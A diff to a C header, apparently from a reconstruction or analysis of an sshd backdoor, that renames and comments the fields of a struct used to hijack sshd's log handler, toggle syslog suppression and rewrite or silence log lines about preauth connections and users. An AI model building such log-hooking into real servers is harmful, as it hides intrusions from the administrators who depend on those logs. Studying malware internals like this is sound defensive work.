@@ -1046,24 +1046,24 @@ typedef void (*log_handler_fn)(
 typedef void (*mm_log_handler_fn)(LogLevel level, int forced, const char *msg, void *ctx);
 
 /*
- * Captures the moving pieces required to hook sshd’s logging path, including the original handler, replacement trampolines, format strings, and guard booleans to keep syslog stable.
+ * Tracks the validated log_handler/log_handler_ctx slots, saved originals, syslog mask toggle, and the rodata/sshlogv pointers needed to rewrite sshd log lines safely.
  */
 typedef struct __attribute__((packed)) sshd_log_ctx {
- BOOL logging_disabled;
- BOOL log_hooking_possible;
- BOOL syslog_disabled;
- u8 log_padding[4];
- char *STR_percent_s;
- char *STR_Connection_closed_by;
- char *STR_preauth;
- char *STR_authenticating;
- char *STR_user;
- void *log_handler_ptr;
- void *log_handler_ctx_ptr;
- log_handler_fn orig_log_handler;
- void *orig_log_handler_ctx;
- void *sshlogv;
- mm_log_handler_fn mm_log_handler;
+ BOOL log_squelched; /* When TRUE the hook bails immediately (used to silence logging after setup or once a rewrite ran). */
+ BOOL handler_slots_valid; /* Loader verified the handler/context qword locations are safe to patch. */
+ BOOL syslog_mask_applied; /* Payload requested syslog suppression; hook temporarily toggles setlogmask around rewrites. */
+ u8 reserved_alignment[4]; /* Padding/alignment between booleans and pointers. */
+ char *fmt_percent_s; /* "%s" literal pulled from sshd rodata for rebuilding sanitized lines. */
+ char *str_connection_closed_by; /* "Connection closed by" fragment used when scrubbing preauth disconnects. */
+ char *str_preauth; /* "(preauth)" suffix for the rewritten disconnect message. */
+ char *str_authenticating; /* "Authenticating" label preceding the reconstructed username/host. */
+ char *str_user; /* "user" label inserted before the redacted username. */
+ log_handler_fn *log_handler_slot; /* Address of sshd's global log_handler function pointer. */
+ void **log_handler_ctx_slot; /* Address of the companion log_handler_ctx pointer. */
+ log_handler_fn saved_log_handler; /* Original handler captured before installing mm_log_handler_hook. */
+ void *saved_log_handler_ctx; /* Original log handler context value (may be NULL). */
+ void *sshlogv_impl; /* Direct pointer to sshlogv for emitting sanitized messages without libc wrappers. */
+ mm_log_handler_fn log_hook_entry; /* Hook trampoline we patch into sshd's handler slot. */
 } sshd_log_ctx_t;
 
 /*
